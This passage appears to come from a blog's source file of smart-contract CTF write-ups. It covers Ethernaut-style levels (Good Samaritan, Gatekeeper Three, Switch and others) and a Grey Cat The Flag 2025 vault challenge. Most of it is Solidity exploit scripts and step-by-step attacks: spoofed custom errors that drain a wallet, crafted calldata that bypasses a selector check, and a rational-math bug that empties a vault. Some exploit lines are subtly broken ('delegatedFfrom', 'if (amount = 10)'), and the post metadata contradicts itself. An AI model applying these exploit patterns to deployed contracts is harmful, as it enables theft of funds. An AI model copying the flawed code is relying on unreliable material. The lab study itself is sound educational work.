dep.cryptoVault();\n        address player = dep.player();\n        address delegatedFrom = dep.delegatedFrom();\n\n        console.log(\"CryptoVault is \",cryptoVault);\n        console.log(\"Player is \",player);\n        console.log(\"LegacyToken is \",delegatedFrom);\n\n        LegacyToken lgt = LegacyToken(delegatedFrom);\n        CryptoVault cv = CryptoVault(cryptoVault);\n\n        console.log(\"Balance of DET in CryptoVault\", dep.balanceOf(cryptoVault));\n        console.log(\"Balance of LGT in CryptoVault\", lgt.balanceOf(cryptoVault));\n\n        console.log(\"The following two address are same\");\n        console.log(\"Delegate of Legacytoken contract\",address(lgt.delegate()));\n        console.log(\"DET :\", address(dep));\n\n        Forta forta = dep.forta();\n\n        //registering bot\n        DetectionBot bot = new DetectionBot();\n        forta.setDetectionBot(address(bot));\n\n        console.log(\"BOT ALERTS Before  exploit :\", forta.botRaisedAlerts(address(bot)));\n\n        new Attack().exploit(); //reverted by bot when it tries to exploit\n\n        console.log(\"Cryptovault balance of DET :\", dep.balanceOf(cryptoVault));\n        console.log(\"BOT alerts after exploit: \",forta.botRaisedAlerts(address(bot)));\n\n        vm.stopBroadcast();\n\n    }\n}\n\ncontract Attack{\n\n    DoubleEntryPoint public dep = DoubleEntryPoint(0xcE33ED049f763622a132480D7348B212777Ee61E);\n    address public cryptoVault = dep.cryptoVault();\n    address public delegatedFrom = dep.delegatedFrom();\n\n    function exploit() public {\n        CryptoVault cv = CryptoVault(cryptoVault);\n        cv.sweepToken(IERC20(delegatedFfrom));\n    }\n}\n\ncontract DetectionBot{\n    DoubleEntryPoint public dep = DoubleEntryPoint(0xcE33ED049f763622a132480D7348B212777Ee61E);\n    address public  cryptoVault = dep.cryptoVault();\n\n    function handleTransaction(address user, bytes calldata msgData)external{\n\n        address origSender;\n        assembly{\n            origSender:=  calldataload(0xa8)\n        }\n\n        if(origSender == cryptoVault){\n            Forta(msg.sender).raiseAlert(user);\n        }\n    }\n}\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`\n$ source .env\n$ forge script script/Level26Solution.s.sol:Level26Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n## Good Samaritan\n\n**Level27.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.0 <0.9.0;\n\nimport \"openzeppelin-contracts/contracts/utils/Address.sol\";\n\ncontract GoodSamaritan {\n    Wallet public wallet;\n    Coin public coin;\n\n    constructor() {\n        wallet = new Wallet();\n        coin = new Coin(address(wallet));\n\n        wallet.setCoin(coin);\n    }\n\n    function requestDonation() external returns(bool enoughBalance){\n        // donate 10 coins to requester\n        try wallet.donate10(msg.sender) {\n            return true;\n        } catch (bytes memory err) {\n            if (keccak256(abi.encodeWithSignature(\"NotEnoughBalance()\")) == keccak256(err)) {\n                // send the coins left\n                wallet.transferRemainder(msg.sender);\n                return false;\n            }\n        }\n    }\n}\n\ncontract Coin {\n    using Address for address;\n\n    mapping(address => uint256) public balances;\n\n    error InsufficientBalance(uint256 current, uint256 required);\n\n    constructor(address wallet_) {\n        // one million coins for Good Samaritan initially\n        balances[wallet_] = 10**6;\n    }\n\n    function transfer(address dest_, uint256 amount_) external {\n        uint256 currentBalance = balances[msg.sender];\n\n        // transfer only occurs if balance is enough\n        if(amount_ <= currentBalance) {\n            balances[msg.sender] -= amount_;\n            balances[dest_] += amount_;\n\n            //if(dest_.isContract()) {\n            if (dest_.code.length != 0){\n                // notify contract\n                INotifyable(dest_).notify(amount_);\n            }\n        } else {\n            revert InsufficientBalance(currentBalance, amount_);\n        }\n    }\n}\n\ncontract Wallet {\n    // The owner of the wallet instance\n    address public owner;\n\n    Coin public coin;\n\n    error OnlyOwner();\n    error NotEnoughBalance();\n\n    modifier onlyOwner() {\n        if(msg.sender != owner) {\n            revert OnlyOwner();\n        }\n        _;\n    }\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    function donate10(address dest_) external onlyOwner {\n        // check balance left\n        if (coin.balances(address(this)) < 10) {\n            revert NotEnoughBalance();\n        } else {\n            // donate 10 coins\n            coin.transfer(dest_, 10);\n        }\n    }\n\n    function transferRemainder(address dest_) external onlyOwner {\n        // transfer balance left\n        coin.transfer(dest_, coin.balances(address(this)));\n    }\n\n    function setCoin(Coin coin_) external onlyOwner {\n        coin = coin_;\n    }\n}\n\ninterface INotifyable {\n    function notify(uint256 amount) external;\n}\n\\`\\`\\`\n\n**Goal:**\n\nWould you be able to drain all the balance from his Wallet?\n\n**Explanation:**\n\n1. There in total three contract are given to us. \\`GoodSamaritan\\` contract deployes \\`Wallet\\` and \\`Coin\\` contracts.\n2. Good samaritan will be the \\`owner\\` of the \\`Wallet\\` contract. And the wallet contract will have 10\\*\\*6 Coin balances.\n3. We are given with the GoodSamaritan instance address. We can able to call the \\`requestDonation()\\` function to get 10 coins from the GoodSamaritan’s Wallet.\n4. One call to \\`requestDonation()\\` will get 10 coins only. To drain all the coins of the Wallet we need to call the \\`requestDonation()\\` function \\`100000\\` times which requires more gas.\n5. Instead we can try to invoke the \\`withdrawRemainder()\\` function which will send all the coins at a time.\n6. The \\`withdrawRemainder()\\` is called when the \\`wallet.donate10(msg.sender)\\` returns error \\`NotEnoughBalance()\\` defined inside Wallet contract.\n7. GoodSamaritan contract expects the error from the Wallet contract only. But as per the solidity docs, the error may be raised and bubbled up by any intermediary contract. That means we cannot predict the origin of the error.\n8. So, can we raise error by ourself to the GoodSamaritan..? yes, When transfering 10 coins to the sender inside the \\`Coin\\` contract it notifies the sender if the sender is a contract.\n9. This means it calls to our \\`msg.sender\\`, now we can implement the \\`notify()\\` function inside our Attack contract and revert with the \\`NotEnoughBalance()\\` error when receiving the 10 coins.\n10. We should revert the \\`NotEnoughBalance()\\` error when only receiving the 10 coins not when the GoodSamaritan sending whole coins.\n11. For this I used the amount parameter sent by the Coin contract through the notify call.\n12. Now GoodSamaritan gets the error \\`NotEnoughBalance()\\` when it sends 10 coins to us, immediately it will send whole coins to us.\n\n**Level27Solution.s.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\nimport \"../src/Level27.sol\";\n\ncontract Level27Sol is Script {\n    GoodSamaritan public instance =\n        GoodSamaritan(0x99A5FD376b27d513922E7b0bc36DbBb1941b31F6);\n\n    function run() external {\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n\n        console.log(\n            \"Balance of Wallet before attack\",\n            instance.coin().balances(address(instance.wallet()))\n        );\n\n        new Attack().exploit();\n\n        console.log(\n            \"Balance of Wallet after attack\",\n            instance.coin().balances(address(instance.wallet()))\n        );\n\n        vm.stopBroadcast();\n    }\n}\n\ncontract Attack {\n    error NotEnoughBalance();\n\n    GoodSamaritan public instance =\n        GoodSamaritan(0x99A5FD376b27d513922E7b0bc36DbBb1941b31F6);\n\n    function exploit() public {\n        instance.requestDonation();\n    }\n\n    function notify(uint256 amount) external {\n        if (amount = 10) {\n            // only revert when receiving 10 coins\n            revert NotEnoughBalance();\n        }\n    }\n}\n\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`\n$ source .env\n$ forge script script/Level27Solution.s.sol:Level27Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n## Gatekeeper Three\n\n**Level28.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract SimpleTrick {\n    GatekeeperThree public target;\n    address public trick;\n    uint256 private password = block.timestamp;\n\n    constructor(address payable _target) {\n        target = GatekeeperThree(_target);\n    }\n\n    function checkPassword(uint256 _password) public returns (bool) {\n        if (_password == password) {\n            return true;\n        }\n        password = block.timestamp;\n        return false;\n    }\n\n    function trickInit() public {\n        trick = address(this);\n    }\n\n    function trickyTrick() public {\n        if (address(this) == msg.sender && address(this) != trick) {\n            target.getAllowance(password);\n        }\n    }\n}\n\ncontract GatekeeperThree {\n    address public owner;\n    address public entrant;\n    bool public allowEntrance;\n\n    SimpleTrick public trick;\n\n    function construct0r() public {\n        owner = msg.sender;\n    }\n\n    modifier gateOne() {\n        require(msg.sender == owner);\n        require(tx.origin != owner);\n        _;\n    }\n\n    modifier gateTwo() {\n        require(allowEntrance == true);\n        _;\n    }\n\n    modifier gateThree() {\n        if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {\n            _;\n        }\n    }\n\n    function getAllowance(uint256 _password) public {\n        if (trick.checkPassword(_password)) {\n            allowEntrance = true;\n        }\n    }\n\n    function createTrick() public {\n        trick = new SimpleTrick(payable(address(this)));\n        trick.trickInit();\n    }\n\n    function enter() public gateOne gateTwo gateThree {\n        entrant = tx.origin;\n    }\n\n    receive() external payable {}\n}\n\\`\\`\\`\n\n**Goal:**\n\nCope with gates and become an entrant.\n\n**Explanation:**\n\n1. Similar to GatekeeperOne and GatekeeperTwo we need to pass the three gate checks by the modifiers when calling the \\`enter()\\` function.\n2. \\`gateOne()\\` can be bypassed if we are the owner of the contract and we need call from a contract.\n3. To be be the owner we can call the \\`construct0r()\\` function its not the actual constructor(), so we can be the owner after calling it.\n4. \\`gateTwo()\\` will be passed if we managed to change the \\`allowEntrance\\` value to true. To do it, we need to call the \\`getAllowance()\\` function with the right password defined inside SimpleTrick contract.\n5. So, we need to deploy a SimpleTrick contract first, we can do this by calling \\`createTrick()\\` function.\n6. After that we need to find the password stored inside SimpleTrick contract. We can do this by using \\`vm.load\\` cheatcode or we can find the password inside our Attack contract.\n7. Because the password is the \\`block.timestamp\\` which will be same during a transaction. If we deploy the SimpeToken and get the block.timestamp inside same call, the block.timestamp will be the password for us.\n8. Callling \\`getAllowance()\\` with this value will pass the gateTwo.\n9. For \\`gateThree()\\` the balance of the GatekeeperThree should be greater than 0.001 ether and when the GatekeeperThree sends 0.001 ether to owner it should return false.\n10. Remember owner is out attack contract, GatekeeperThree sending ether using \\`send\\` call. \\`send\\` call will return \\`false\\` when the transaction fails.\n11. So, we have to deny the ether sent by the GatekeeperThree. To do this, I haven’t implemented any fallback or receive function inside my Attack contract.\n12. For this reason the send will return false to GatekeeperThree contract and now we will able to register as entrant.\n\n**Level28Solution.s.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\nimport \"../src/Level28.sol\";\n\ncontract Level28Sol is Script {\n    GatekeeperThree public instance = GatekeeperThree(payable(0x1B3158cc2634Fbf84299D79D52a2E63680B63559));\n    function run() external{\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n\n        console.log(\"Gate Owner : \", instance.owner());\n\n        Attack attack = new Attack{value: 0.009 ether}();\n        attack.exploit();\n\n        console.log(\"Allow Entrance : \", instance.allowEntrance());\n        console.log(\"Gate keeper Owner : \", instance.owner());\n        console.log(\"Entrant : \", instance.entrant());\n        vm.stopBroadcast();\n    }\n}\n\ncontract Attack {\n    GatekeeperThree public instance = GatekeeperThree(payable(0x1B3158cc2634Fbf84299D79D52a2E63680B63559));\n\n    constructor() payable{}\n    function exploit() public {\n\n        instance.construct0r();//bypassed first gate\n\n        //bypassing second gate\n        instance.createTrick();\n\n        // uint256 password = vm.getBlockTimestamp();\n        instance.getAllowance(block.timestamp);\n\n        (bool success, ) = payable(address(instance)).call{value : address(this).balance}(\"\");\n        require(success, \"Tx Failed\");\n\n        instance.enter();\n\n    }\n}\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`\n$ source .env\n$ forge script script/Level28Solution.s.sol:Level28Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n## Switch\n\n**Level29.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Switch {\n    bool public switchOn; // switch is off\n    bytes4 public offSelector = bytes4(keccak256(\"turnSwitchOff()\"));\n\n    modifier onlyThis() {\n        require(msg.sender == address(this), \"Only the contract can call this\");\n        _;\n    }\n\n    modifier onlyOff() {\n        // we use a complex data type to put in memory\n        bytes32[1] memory selector;\n        // check that the calldata at position 68 (location of _data)\n        assembly {\n            calldatacopy(selector, 68, 4) // grab function selector from calldata\n        }\n        require(selector[0] == offSelector, \"Can only call the turnOffSwitch function\");\n        _;\n    }\n\n    function flipSwitch(bytes memory _data) public onlyOff {\n        (bool success,) = address(this).call(_data);\n        require(success, \"call failed :(\");\n    }\n\n    function turnSwitchOn() public onlyThis {\n        switchOn = true;\n    }\n\n    function turnSwitchOff() public onlyThis {\n        switchOn = false;\n    }\n}\n\\`\\`\\`\n\n**Goal:**\n\nJust have to flip the switch.\n\n**Explanation:**\n\n1. Switch contract has three functions \\`turnSwitchOff()\\`, \\`turnSwitchOn()\\` and \\`flipSwitch()\\`. We can only able to call flipSwitch function.\n2. By using this flipSwitch only we have to call the \\`turnSwitchOn()\\` function. For this we need to pass the calldata for the function call \\`turnSwitchOn()\\`.\n3. But If we pass the \\`turnSwitchOn()\\` calldata to the \\`flipSwitch()\\` it will be reverted by \\`onlyOff\\` modifier.\n4. Because, onlyOff is checking that the calldata’s 68 to 72 bytes should only contain the signature of the \\`turnSwitchOff()\\` function.\n5. The vulnerability is present inside the \\`onlyOff()\\` modifier as its function signature check byte position is hardcoded (68,4).\n6. We can modify the \\`calldata\\` in order to bypass the check and as well as call the \\`turnSwitchOn()\\` function.\n7. When we call a function on a contract, the \\`calldata\\` will be sent via the transaction as \\`msg.data.\\`\n8. Now, we have to send the \\`turnSwitchOn()\\` signature along with this \\`calldata\\`. And we should make sure that only \\`turnSwitchOn()\\` signature should be passed to the \\`call\\` inside \\`flipSwitch()\\`.\n9. The data which is used inside the function will be specified by the \\`offset\\`. The function will make use of the actual data that is pointed by the offset.\n10. As the \\`onlyOff\\` modifier uses the hardcoded check, we can modify the calldata to be able to insert the \\`turnSwitchOff()\\` function signature at the 68th bytes and append the \\`turnSwitchOn()\\` signature.\n11. Now we have to change the offset of the calldata in such a way that it points to the \\`turnSwitchOn()\\` signature.\n\n\\`\\`\\`\ncalldata to bypass onlyOff\n  => <flipSwitch Singature> <Offset> <Dummy Data> <turnSwitchOff Signature> <length of data> <turnSwitchOn Signature>\n\n  30c13ade - flipSwitch(bytes)\n\n[000]: 0000000000000000000000000000000000000000000000000000000000000060 --offset position for actual data\n[020]: 0000000000000000000000000000000000000000000000000000000000000000 --adding dummy bytes to bypass the check\n[040]: 20606e1500000000000000000000000000000000000000000000000000000000 --turnSwitchOff()--ByPassed onlyOff modifier\n[060]: 0000000000000000000000000000000000000000000000000000000000000004 --Length of the turnSwitchOff() signature data\n[080]: 76227e1200000000000000000000000000000000000000000000000000000000 --turnSwitchOn()-- Won the challenge\n\\`\\`\\`\n\n12.Now this \\`calldata\\` will bypasses the check of \\`onlyOff\\` and we modified the offset to point it to the \\`turnSwitchOn()\\` signature.\n\n13.This will call the \\`turnSwitchOn()\\` function in Switch contract.\n\n**Level29Solution.s.sol**\n\n\\`\\`\\`solidity\n// SPDX- License-Identifier :MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\nimport \"../src/Level29.sol\";\n\ncontract Level29Sol is Script{\n\n    Switch public instance  = Switch(0xBAfeeF31f97943fe11de5a04138f1AED8297aBb6);\n\n    function run() external {\n\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n\n        bytes memory data = abi.encodeWithSignature(\"flipSwitch(bytes)\",0x60,\n         0x00, 0x20606e1500000000000000000000000000000000000000000000000000000000,0x04,\n         0x76227e1200000000000000000000000000000000000000000000000000000000);\n\n        console.logBytes(data);\n\n         address(instance).call(data);\n         /*\n\n         -----------------------------------------------console.log(data)----------------------------------------\n          Possible methods:\n            30c13ade      - flipSwitch(bytes)\n            ------------\n            [000]: 0000000000000000000000000000000000000000000000000000000000000060 --offset position for actual data\n            [020]: 0000000000000000000000000000000000000000000000000000000000000000 --adding dummy bytes to bypass the check\n            [040]: 20606e1500000000000000000000000000000000000000000000000000000000 --turnSwitchOff()--ByPassed onlyOff modifier\n            [060]: 0000000000000000000000000000000000000000000000000000000000000004 --Length of the turnSwitchOff() signature data\n            [080]: 76227e1200000000000000000000000000000000000000000000000000000000 --turnSwitchOn()-- Won the challenge\n\n         */\n\n         console.log(\"Switch is :\", instance.switchOn());\n\n         vm.stopBroadcast();\n\n    }\n}\n\\`\\`\\`\n\n**To run the script:**\n\n\\`\\`\\`\n$ source .env\n$ forge script script/Level29Solution.s.sol:Level29Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n\n`,\n};\n","import { Blog } from \"../blog-data\";\n\nexport const GreyCatTheFlag2025RationalChallengeWriteup: Blog = {\n  slug: \"gas-optimization-techniques\",\n  title: \"Grey Cat The Flag 2025 Rational Challenge Writeup\",\n  excerpt:\n    \"A detailed writeup of exploiting a subtle bug in a custom rational number library to drain a vault system in the Grey Cat The Flag 2025 CTF challenge.\",\n  date: \"2024-01-10\",\n  readTime: \"15 min read\",\n  tags: [\n    \"CTF\",\n    \"Smart Contract Security\",\n    \"Solidity\",\n    \"Vulnerability Analysis\",\n  ],\n  image: \"/greycattheflag.png\",\n  content: `## Challenge Overview\n\n**Objective:** Start with 1000 GREY tokens and exploit the vault system to accumulate at least 6000 GREY tokens.\n\n## Architecture Analysis\n\n### Core Components\n\nThe challenge consists of three main contracts working together:\n\n1. **SetUp Contract** - Challenge environment and initialization\n2. **RationalVault** - ERC20-like vault with custom rational number precision\n3. **RationalLib** - Custom library for fractional number arithmetic\n\n### SetUp Contract\n\n\\`\\`\\`javascript\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport {GREY} from \"./lib/GREY.sol\";\nimport {RationalVault} from \"./Vault.sol\";\n\ncontract Setup {\n    bool public claimed;\n\n    // GREY token\n    GREY public grey;\n\n    // Challenge contracts\n    RationalVault public vault;\n\n    constructor() {\n        // Deploy the GREY token contract\n        grey = new GREY();\n\n        // Deploy challenge contracts\n        vault = new RationalVault(address(grey));\n\n        // Mint 6000 GREY for setup\n        grey.mint(address(this), 6000e18);\n\n        // Deposit 5000 GREY into the vault\n        grey.approve(address(vault), 5000e18);\n        vault.deposit(5000e18);\n    }\n\n    // Note: Call this function to claim 1000 GREY for the challenge\n    function claim() external {\n        require(!claimed, \"already claimed\");\n        claimed = true;\n\n        grey.mint(msg.sender, 1000e18);\n    }\n\n    // Note: Challenge is solved when you have 6000 GREY\n    function isSolved() external view returns (bool) {\n        return grey.balanceOf(msg.sender) >= 6000e18;\n    }\n}\n\n\\`\\`\\`\n\nThe SetUp contract initializes the challenge environment:\n- Deploys a GREY token and RationalVault\n- Mints 6000 GREY tokens to itself\n- Deposits 5000 GREY into the vault (receiving 5000 shares)\n- Reserves 1000 GREY for the player via \\`claim()\\` function\n- Victory condition: Player must accumulate ≥ 6000 GREY tokens\n\n### RationalVault Contract\n\n\\`\\`\\`javascript\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.20;\n\nimport {IERC20} from \"./lib/IERC20.sol\";\nimport {Rational, RationalLib} from \"./lib/Rational.sol\";\n\ncontract RationalVault {\n    IERC20 public asset;\n\n    mapping(address => Rational) internal sharesOf;\n    Rational internal totalShares;\n\n    // ======================================== CONSTRUCTOR ========================================\n\n    constructor(address _asset) {\n        asset = IERC20(_asset);\n    }\n\n    // ======================================== MUTATIVE FUNCTIONS ========================================\n\n    function deposit(uint128 amount) external {\n        Rational _shares = convertToShares(amount);\n\n        sharesOf[msg.sender] = sharesOf[msg.sender] + _shares;\n        totalShares = totalShares + _shares;\n\n        asset.transferFrom(msg.sender, address(this), amount);\n    }\n\n    function mint(uint128 shares) external {\n        Rational _shares = RationalLib.fromUint128(shares);\n        uint256 amount = convertToAssets(_shares);\n\n        sharesOf[msg.sender] = sharesOf[msg.sender] + _shares;\n        totalShares = totalShares + _shares;\n\n        asset.transferFrom(msg.sender, address(this), amount);\n    }\n\n    function withdraw(uint128 amount) external {\n        Rational _shares = convertToShares(amount);\n\n        sharesOf[msg.sender] = sharesOf[msg.sender] - _shares;\n        totalShares = totalShares - _shares;\n\n        asset.transfer(msg.sender, amount);\n    }\n\n    function redeem(uint128 shares) external {\n        Rational _shares = RationalLib.fromUint128(shares);\n        uint256 amount = convertToAssets(_shares);\n\n        sharesOf[msg.sender] = sharesOf[msg.sender] - _shares;\n        totalShares = totalShares - _shares;\n\n        asset.transfer(msg.sender, amount);\n    }\n\n    // ======================================== VIEW FUNCTIONS ========================================\n\n    function totalAssets() public view returns (uint128) {\n        return uint128(asset.balanceOf(address(this)));\n    }\n\n    function convertToShares(uint128 assets) public view returns (Rational) {\n        if (totalShares == RationalLib.ZERO) return RationalLib.fromUint128(assets);\n\n        Rational _assets = RationalLib.fromUint128(assets);\n        Rational _totalAssets = RationalLib.fromUint128(totalAssets());\n        Rational _shares = _assets / _totalAssets * totalShares;\n\n        return _shares;\n    }\n\n    function convertToAssets(Rational shares) public view returns (uint128) {\n        if (totalShares == RationalLib.ZERO) return RationalLib.toUint128(shares);\n\n        Rational _totalAssets = RationalLib.fromUint128(totalAssets());\n        Rational _assets = shares / totalShares * _totalAssets;\n\n        return RationalLib.toUint128(_assets);\n    }\n\n    function totalSupply() external view returns (uint256) {\n        return RationalLib.toUint128(totalShares);\n    }\n\n    function balanceOf(address account) external view returns (uint256) {\n        return RationalLib.toUint128(sharesOf[account]);\n    }\n}\n\n\\`\\`\\`\n\nThe vault implements a shares-based system similar to ERC4626:\n- **Deposits/Mints:** Users deposit assets to receive proportional shares\n- **Withdrawals/Redeems:** Users burn shares to retrieve underlying assets\n- **Conversion Logic:** Dynamic exchange rates between assets and shares based on vault balance\n- **Precision:** Uses custom Rational math instead of standard integer arithmetic\n\n### RationalLib Contract\n\n\\`\\`\\`javascript\n\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.20;\n\n// Upper 128 bits is the numerator, lower 128 bits is the denominator\ntype Rational is uint256;\n\nusing {add as +, sub as -, mul as *, div as /, eq as ==, neq as !=} for Rational global;\n\n// ======================================== CONVERSIONS ========================================\n\nlibrary RationalLib {\n    Rational constant ZERO = Rational.wrap(0);\n\n    function fromUint128(uint128 x) internal pure returns (Rational) {\n        return toRational(x, 1);\n    }\n\n    function toUint128(Rational x) internal pure returns (uint128) {\n        (uint256 numerator, uint256 denominator) = fromRational(x);\n        return numerator == 0 ? 0 : uint128(numerator / denominator);\n    }\n}\n\n// ======================================== OPERATIONS ========================================\n\nfunction add(Rational x, Rational y) pure returns (Rational) {\n    (uint256 xNumerator, uint256 xDenominator) = fromRational(x);\n    (uint256 yNumerator, uint256 yDenominator) = fromRational(y);\n\n    if (xNumerator == 0) return y;\n    if (yNumerator == 0) return x;\n\n    // (a / b) + (c / d) = (ad + cb) / bd\n    uint256 numerator = xNumerator * yDenominator + yNumerator * xDenominator;\n    uint256 denominator = xDenominator * yDenominator;\n\n    return toRational(numerator, denominator);\n}\n\nfunction sub(Rational x, Rational y) pure returns (Rational) {\n    (uint256 xNumerator, uint256 xDenominator) = fromRational(x);\n    (uint256 yNumerator, uint256 yDenominator) = fromRational(y);\n\n    if (yNumerator != 0) require(xNumerator != 0, \"Underflow\");\n\n    // (a / b) - (c / d) = (ad - cb) / bd\n    // a / b >= c / d implies ad >= cb, so the subtraction will never underflow when x >= y\n    uint256 numerator = xNumerator * yDenominator - yNumerator * xDenominator;\n    uint256 denominator = xDenominator * yDenominator;\n\n    return toRational(numerator, denominator);\n}\n\nfunction mul(Rational x, Rational y) pure returns (Rational) {\n    (uint256 xNumerator, uint256 xDenominator) = fromRational(x);\n    (uint256 yNumerator, uint256 yDenominator) = fromRational(y);\n\n    if (xNumerator == 0 || yNumerator == 0) return RationalLib.ZERO;\n\n    // (a / b) * (c / d) = ac / bd\n    uint256 numerator = xNumerator * yNumerator;\n    uint256 denominator = xDenominator * yDenominator;\n\n    return toRational(numerator, denominator);\n}\n\nfunction div(Rational x, Rational y) pure returns (Rational) {\n    (uint256 xNumerator, uint256 xDenominator) = fromRational(x);\n    (uint256 yNumerator, uint256 yDenominator) = fromRational(y);\n\n    if (xNumerator == 0) return RationalLib.ZERO;\n    require(yNumerator != 0, \"Division by zero\");\n\n    // (a / b) / (c / d) = ad / bc\n    uint256 numerator = xNumerator * yDenominator;\n    uint256 denominator = xDenominator * yNumerator;\n\n    return toRational(numerator, denominator);\n}\n\nfunction eq(Rational x, Rational y) pure returns (bool) {\n    (uint256 xNumerator,) = fromRational(x);\n    (uint256 yNumerator,) = fromRational(y);\n    if (xNumerator == 0 && yNumerator == 0) return true;\n\n    return Rational.unwrap(x) == Rational.unwrap(y);\n}\n\nfunction neq(Rational x, Rational y) pure returns (bool) {\n    return !eq(x, y);\n}\n\n// ======================================== HELPERS ========================================\n\nfunction fromRational(Rational v) pure returns (uint256 numerator, uint256 denominator) {\n    numerator = Rational.unwrap(v) >> 128;\n    denominator = Rational.unwrap(v) & type(uint128).max;\n}\n\nfunction toRational(uint256 numerator, uint256 denominator) pure returns (Rational) {\n    if (numerator == 0) return RationalLib.ZERO;\n\n    uint256 d = gcd(numerator, denominator);\n    numerator /= d;\n    denominator /= d;\n\n    require(numerator <= type(uint128).max && denominator <= type(uint128).max, \"Overflow\");\n\n    return Rational.wrap(numerator << 128 | denominator);\n}\n\nfunction gcd(uint256 x, uint256 y) pure returns (uint256) {\n    while (y != 0) {\n        uint256 t = y;\n        y = x % y;\n        x = t;\n    }\n    return x;\n}\n\n\\`\\`\\`\n\nThis library implements fractional numbers as a custom type:\n\n\\`\\`\\`solidity\ntype Rational is uint256;\n\\`\\`\\`\n\n**Encoding Scheme:**\n\\`\\`\\`\n|   Upper 128 bits   |   Lower 128 bits   |\n|     Numerator      |    Denominator     |\n\\`\\`\\`\n\n**Key Functions:**\n- \\`toRational()\\` - Encodes numerator/denominator into packed uint256\n- \\`fromRational()\\` - Extracts numerator and denominator from packed value\n- Arithmetic operations: \\`add()\\`, \\`sub()\\`, \\`mul()\\`, \\`div()\\`\n\n## Vulnerability Analysis\n\n### The Critical Bug\n\nThe vulnerability lies in the \\`sub()\\` function of RationalLib:\n\n\\`\\`\\`solidity\n\nfunction sub(Rational x, Rational y) pure returns (Rational) {\n    (uint256 xNumerator, uint256 xDenominator) = fromRational(x);\n    (uint256 yNumerator, uint256 yDenominator) = fromRational(y);\n\n    if (yNumerator != 0) require(xNumerator != 0, \"Underflow\");\n\n    // (a / b) - (c / d) = (ad - cb) / bd\n    // a / b >= c / d implies ad >= cb, so the subtraction will never underflow when x >= y\n    uint256 numerator = xNumerator * yDenominator - yNumerator * xDenominator;\n    uint256 denominator = xDenominator * yDenominator;\n\n    return toRational(numerator, denominator);\n}\n\\`\\`\\`\n\n**The Issue:**\nWhen subtracting zero (\\`yNumerator == 0, yDenominator == 0\\`) from any rational number \\`x\\`:\n- The underflow check is bypassed\n- Calculation becomes: \\`numerator = xNumerator * 0 - 0 * xDenominator = 0\\`, \\`denominator = xDenominator * 0 = 0\\`\n- \\`toRational(0, 0)\\` returns the canonical ZERO rational\n- **Result: \\`x - 0 = 0\\` instead of \\`x\\`**\n\nThis breaks the fundamental mathematical property that \\`x - 0 = x\\`.\n\n## Exploitation Vector\n\nThe vault's \\`redeem()\\` and \\`withdraw()\\` functions both perform:\n\\`\\`\\`solidity\ntotalShares = totalShares - _shares;\n\\`\\`\\`\n\nBy calling \\`redeem(0)\\` or \\`withdraw(0)\\`, we can trigger the bug where \\`totalShares - ZERO = ZERO\\`.\n\n## Exploitation Strategy\n\n### Step-by-Step Attack\n\n1. **Initial Setup**\n   \\`\\`\\`solidity\n   setup.claim(); // Receive 1000 GREY tokens\n   \\`\\`\\`\n\n2. **Trigger the Vulnerability**\n   \\`\\`\\`solidity\n   vault.redeem(0); // totalShares becomes ZERO due to bug\n   \\`\\`\\`\n   \n   After this call:\n   - Vault's \\`totalShares\\` = 0 (should be 5000e18)\n   - Vault's asset balance = 5000e18 GREY (unchanged)\n\n3. **Re-bootstrap with Minimal Investment**\n   \\`\\`\\`solidity\n   vault.mint(1); // Mint 1 share for 1 wei\n   \\`\\`\\`\n   \n   Since \\`totalShares == 0\\`, the conversion rate is 1:1:\n   - Cost: 1 wei GREY\n   - Received: 1 share\n   - New state: \\`totalShares = 1\\`, vault balance = 5000e18 + 1 wei\n\n4. **Drain the Vault**\n   \\`\\`\\`solidity\n   vault.redeem(1); // Redeem our single share\n   \\`\\`\\`\n   \n   Conversion calculation:\n   \\`\\`\\`\n   assets = shares × totalAssets / totalShares\n   assets = 1 × (5000e18 + 1) / 1 = 5000e18 + 1 wei\n   \\`\\`\\`\n\n5. **Final State**\n   - Started with: 1000e18 GREY\n   - Spent: 1 wei GREY\n   - Received: 5000e18 + 1 wei GREY\n   - **Total: 6000e18 GREY** \n\n## Solution\n\n\\`\\`\\`javascript\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport {Test, console} from \"forge-std/Test.sol\";\nimport {Setup} from \"../src/rational_challenge/Setup.sol\";\n\ncontract RationalSolution is Test {\n    Setup public setupp;\n    address public attacker = makeAddr(\"attacker\");\n\n    function setUp() public {\n        setupp = new Setup();\n    }\n\n    function testExploit() public {\n        //first we are claiming our 1000 GREY given by the setup contract\n        vm.startPrank(attacker);\n        setupp.claim();\n\n        console.log(\"balance of attacker before redeeming\", setupp.vault().asset().balanceOf(attacker) / 1e18);\n        console.log(\"total supply of vault  before redeeming\", setupp.vault().totalSupply() / 1e18);\n\n        // setupp.vault().withdraw(0);\n        setupp.vault().redeem(0);\n\n        console.log(\n            \"balance of attacker after redeeming by the attacker\", setupp.vault().asset().balanceOf(attacker) / 